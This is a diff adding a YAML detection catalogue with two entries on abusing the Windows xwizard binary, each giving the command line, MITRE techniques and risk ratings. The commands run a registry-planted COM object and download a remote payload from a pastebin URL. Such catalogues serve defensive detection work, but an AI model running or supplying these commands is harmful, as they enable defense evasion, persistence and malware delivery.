@@ -1,0 +1,44 @@
+- command: xwizard RunWizard /t /u {00000001-0000-0000-0000-0000FEEDACDC}
+  description: Abuse xwizard to run a custom COM object previously inserted into the local registry.  /t and /u prevent error messages in certain builds.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218
+    Privilege Escalation:
+      - T1546.015
+    Persistence:
+      - T1546.015
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Xwizard/
+  risk: High
+  risk_reason: Usage of xwizard in this manner is typically suspicious.
+  fidelity: High
+  fidelity_reason: This type of commandline behavior is typically rare for most users.
+  tool: xwizard
+  threatactors:
+    N/A:
+      - N/A
+- command: xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z https://pastebin.com/raw/iLxUT5gM
+  description: Abuse xwizard with RemoteApp and Connections wizard to download a remotely hosted paytload.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Xwizard/
+  risk: High
+  risk_reason: Usage of xwizard in this manner is typically suspicious.
+  fidelity: High
+  fidelity_reason: This type of commandline behavior is typically rare for most users.
+  tool: xwizard
+  threatactors:
+    N/A:
+      - N/A
